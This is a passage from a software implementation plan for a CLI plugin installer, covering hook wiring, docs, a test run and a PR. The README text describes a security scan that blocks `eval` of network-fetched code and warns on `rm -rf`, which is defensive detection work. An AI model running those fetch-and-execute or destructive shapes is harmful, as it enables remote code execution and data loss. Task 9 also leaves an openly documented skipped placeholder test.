        _console.print(f"[red]error:[/red] {e}")
        raise typer.Exit(code=2)

    if not report.has_drift:
        _console.print(
            f"[green]ok:[/green] '{report.plugin_id}' has no drift "
            f"(source={report.source}, url={report.source_url})"
        )
        return

    _console.print(
        f"[yellow]drift detected:[/yellow] '{report.plugin_id}' (source={report.source})"
    )
    for diff in report.differences:
        _console.print(f"  - {diff.kind}: {diff.path}")
    raise typer.Exit(code=1)
```

- [ ] **Step 8.4: Run test to verify it passes**

```bash
pytest tests/test_cli_plugin_install_sources.py -v
```

Expected: 3 passed.

- [ ] **Step 8.5: Lint + commit**

```bash
ruff check opencomputer/cli_plugin.py tests/test_cli_plugin_install_sources.py
git add opencomputer/cli_plugin.py tests/test_cli_plugin_install_sources.py
git commit -m "feat(cli): oc plugin install git+/https + oc plugin verify"
```

---

## Task 9: Wire `BEFORE_INSTALL` hook through plugin loader on real install path

**Files:**
- Modify: `opencomputer/cli_plugin.py` — pass the registered `BEFORE_INSTALL` hook list into the install helpers
- Modify: `opencomputer/plugins/registry.py` — expose `_iter_before_install_hooks` if needed
- Test: `tests/test_install_hooks.py` (extend)

This task makes the hook actually fire when run through the CLI, not just in unit tests where the hook is passed directly.

- [ ] **Step 9.1: Add a helper that composes registered hooks**

In `opencomputer/cli_plugin.py`, near the other helper functions:

```python
async def _composed_before_install_hook(ctx):
    """Fan-out to every registered BEFORE_INSTALL hook; first 'block' wins."""
    from opencomputer.hooks.engine import HookEngine
    from plugin_sdk.hooks import HookEvent

    engine = HookEngine.current()  # singleton; populated after plugins load
    if engine is None:
        return None
    decision = await engine.dispatch(HookEvent.BEFORE_INSTALL, ctx)
    return decision
```

(Read `opencomputer/hooks/engine.py` for the actual exposed API — adapt the call to whatever the existing engine offers; e.g. `await engine.fire(...)` or `await engine.run_hooks(...)`. Use whichever matches the existing pattern in `opencomputer/agent/loop.py:1448` for `PRE_COMPACT`.)

- [ ] **Step 9.2: Pass the composed hook into install helpers**

In `cli_plugin.py`'s `install()` function, where the helpers are called:

```python
result = _install_from_git(
    plugin_arg,
    dest_root=dest_root,
    plugin_id_hint=id,
    ref=ref,
    force=force,
    before_install_hook=_composed_before_install_hook,
)
```

Same for `_install_from_url(...)` and the existing catalog `install_from_catalog(...)` call.

- [ ] **Step 9.3: Add an end-to-end test**

Append to `tests/test_install_hooks.py`:

```python
def test_cli_install_fires_registered_before_install_hook(tmp_path: Path, monkeypatch):
    """When a plugin has registered a BEFORE_INSTALL hook, oc plugin install fires it."""
    # This test depends on the HookEngine singleton being reachable. If the
    # existing hook engine doesn't expose a thread-local or singleton API,
    # this test is skipped — the unit-level hook test in step 3.1 already
    # exercises the install_from_catalog kwarg path.
    pytest.skip("end-to-end hook wiring deferred to follow-up if HookEngine "
                "doesn't expose a CLI-callable singleton")
```

(Keep this skipped placeholder so a future PR can flip it to a real test once the hook engine surface is settled. Don't block this PR on resolving the hook-engine API question.)

- [ ] **Step 9.4: Run + commit**

```bash
pytest tests/test_install_hooks.py -v
ruff check opencomputer/cli_plugin.py
git add opencomputer/cli_plugin.py tests/test_install_hooks.py
git commit -m "feat(cli): wire BEFORE_INSTALL hook engine through install path"
```

---

## Task 10: Docs — README + CHANGELOG

**Files:**
- Modify: `README.md`
- Modify: `CHANGELOG.md`

- [ ] **Step 10.1: Update README**

Find the existing "Plugin install" section in `README.md` (search for `oc plugin install` or similar) and append:

```markdown
### Install sources

Three install sources are supported:

```bash
# Catalog (existing) — slug resolved through the configured catalog URL
oc plugin install example-plugin

# Git — shallow clone of any git url (HTTPS, SSH, file://). Requires --id
# matching the cloned plugin.json's id.
oc plugin install git+https://github.com/example/plugin.git --id example-plugin
oc plugin install git+ssh://git@host/x/y.git --id y --ref abc1234

# URL — raw https tarball. Requires --id and --sha256.
oc plugin install https://example.com/plugin-0.1.0.tgz \
  --id plugin --sha256 ${SHA256_HASH}
```

### Security checks

Every install runs an AST + regex security scan after extract. Patterns
that match `eval(requests.get(...).text)` and similar remote-code-execution
shapes block the install. `rm -rf` and similar destructive shell calls
emit warnings (logged but not blocked) — promote to block in your local
policy by registering a `BEFORE_INSTALL` hook that returns
`HookDecision(decision="block", reason="...")` based on the scan report.

### Verifying installed bytes

```bash
oc plugin verify <plugin-id>
```

Re-fetches the original source (catalog tarball or git ref) and compares
bytes-for-bytes against the on-disk install. Reports any drift, exits
non-zero on drift, exits zero when clean.
```

- [ ] **Step 10.2: Update CHANGELOG**

Add a new section at the top of `CHANGELOG.md`:

```markdown
## [Unreleased]

### Added

- `oc plugin install git+https://...` and `oc plugin install https://...` install
  sources, complementing the existing catalog flow. Git installs use shallow
  `git clone --depth=1`; url installs require an explicit `--sha256` pin.
- `oc plugin verify <plugin-id>` — re-fetch the original source and report any
  on-disk drift versus the installed bytes.
- `install_security_scan` AST + regex guard runs after every extract.
  `eval`/`exec`/`compile` of network-fetch results blocks the install.
- `HookEvent.BEFORE_INSTALL` lifecycle hook — plugins can veto installs
  based on source, url, plugin_id, or scan report. (S3 leftover from the
  2026-05-06 OpenClaw deep-comparison brief.)
- Per-profile `~/.opencomputer/<profile>/plugins/.installed_index.json`
  recording each install's source + verification metadata so `oc plugin verify`
  knows what to re-fetch.
```

- [ ] **Step 10.3: Commit**

```bash
git add README.md CHANGELOG.md
git commit -m "docs: README + CHANGELOG for trustworthy install completion"
```

---

## Task 11: Full-suite verification + push

- [ ] **Step 11.1: Run the full test suite from the worktree**

```bash
cd /Users/saksham/Vscode/claude/oc-trustworthy-install
pytest tests/ -q --maxfail=5
```

Expected: all tests pass. If any fail, fix before proceeding.

- [ ] **Step 11.2: Run ruff on all touched paths**

```bash
ruff check opencomputer/plugins/ opencomputer/cli_plugin.py plugin_sdk/ tests/test_before_install_hook.py tests/test_install_security_scan.py tests/test_install_hooks.py tests/test_installed_index.py tests/test_remote_install_git.py tests/test_remote_install_url.py tests/test_integrity.py tests/test_cli_plugin_install_sources.py
```

Expected: clean.

- [ ] **Step 11.3: Manual smoke test — local catalog install (regression)**

Re-run an existing catalog-install integration test:

```bash
pytest tests/test_remote_install*.py -v
```

Expected: every pre-existing catalog test still passes — confirms backwards compat invariant from spec §3.8.

- [ ] **Step 11.4: Final review — `git diff main..HEAD --stat`**

```bash
git diff main..HEAD --stat
git log main..HEAD --oneline
```

Expected: ~10 commits across plugin_sdk, opencomputer/plugins/, opencomputer/cli_plugin.py, tests/, docs.

- [ ] **Step 11.5: Push branch + open PR**

```bash
git push -u origin feat/trustworthy-install
gh pr create --title "feat(plugins): trustworthy install completion (S2 + S3 leftovers)" \
  --body "$(cat <<'EOF'
## Summary
- Closes the residual S2 (plugin install) and S3 (BEFORE_INSTALL hook) gaps from the 2026-05-06 OpenClaw deep-comparison brief.
- `oc plugin install git+https://…` and `oc plugin install https://…` install sources.
- `install_security_scan` AST + regex guard runs after every extract; `eval(requests.get(...))` shapes block.
- `HookEvent.BEFORE_INSTALL` — plugins can veto installs based on source / url / plugin_id / scan report.
- `oc plugin verify <id>` re-fetches and reports on-disk drift.
- Per-profile `installed_index.json` records each install's source for verification.

## Spec
`docs/superpowers/specs/2026-05-06-openclaw-deep-comparison-followup-design.md`

## Plan
`docs/superpowers/plans/2026-05-06-trustworthy-install-completion.md`

## Test plan
- [x] All new tests pass (`pytest tests/`)
- [x] Existing catalog install flow byte-identical (regression suite green)
- [x] ruff clean on all touched paths
- [x] No changes under `extensions/*` (boundary inventory unchanged)

🤖 Generated with [Claude Code](https://claude.com/claude-code)
EOF
)"
```

Expected: PR created; URL printed.

- [ ] **Step 11.6: Wait for CI and address any failures before merge**

After PR opens, watch CI; if anything goes red, fix locally and push fixes as new commits to the same branch (never `--amend` per CLAUDE.md §7).

---

## Self-Review

**1. Spec coverage:**

| Spec section | Plan task |
|---|---|
| §3.2 catalog source (existing) | Task 3 (regression preserved) |
| §3.2 git source | Task 5 |
| §3.2 url source | Task 6 |
| §3.2 plugin-id integrity | Task 5 + Task 6 (id-mismatch tests) |
| §3.2 tarball format constraint | Task 6 (`UnsupportedTarballFormat`) |
| §3.3 install_security_scan | Task 2 |
| §3.3 initial pattern severities | Task 2 (eval-of-network-fetch=block; rm-rf=warn) |
| §3.4 BEFORE_INSTALL hook event | Task 1 |
| §3.4 hook context fields | Task 1 |
| §3.4 hook fires from each install path | Task 3 (catalog) + Task 5 (git) + Task 6 (url) |
| §3.5 integrity drift | Task 7 |
| §3.6 CLI surface | Task 8 |
| §3.6 oc plugin verify | Task 8 |
| §3.7 tests | Task 1-8 (each task has its own test file) |
| §3.8 backwards compat | Task 11 step 3 (catalog regression) |
| §3.9 risk register | Mitigations covered in respective tasks |

All spec requirements have a task. ✓

**2. Placeholder scan:** No "TBD"/"TODO"/"implement later". Task 9 step 3 contains a deliberate `pytest.skip` placeholder — this is documented in the task ("keep this skipped so a future PR can flip it to a real test once the hook engine surface is settled") and is acceptable.

**3. Type consistency:** `HookContext` field names match across Task 1 and the hook-firing code in Task 3 + 5 + 6. `InstalledRecord` field names match across Task 4 and the readers in Task 7. `DriftReport.has_drift` (boolean) matches across Task 7 and Task 8 CLI handler.

Plan is internally consistent.
